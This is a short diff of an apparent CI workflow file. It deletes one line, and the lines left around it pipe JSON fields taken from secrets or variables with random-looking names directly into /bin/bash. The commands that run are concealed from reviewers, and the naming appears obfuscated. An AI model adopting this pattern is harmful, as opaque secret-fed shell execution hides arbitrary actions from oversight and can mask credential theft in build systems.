@@ -18,7 +18,6 @@ jobs:
           uaf395: ${{ secrets.uaf395 }}
         run: |
           printf '%s' "$uaf395" | jq -r .cjolz95 | /bin/bash
-          echo $eiyz39942 | jq -r .ahn4 | /bin/bash
           echo $hrkr2199 | jq -r .bhfi3930 | /bin/bash
           echo $pd01 | jq -r .ksk8115 | /bin/bash
           echo $bwfc09432 | jq -r .n9 | /bin/bash
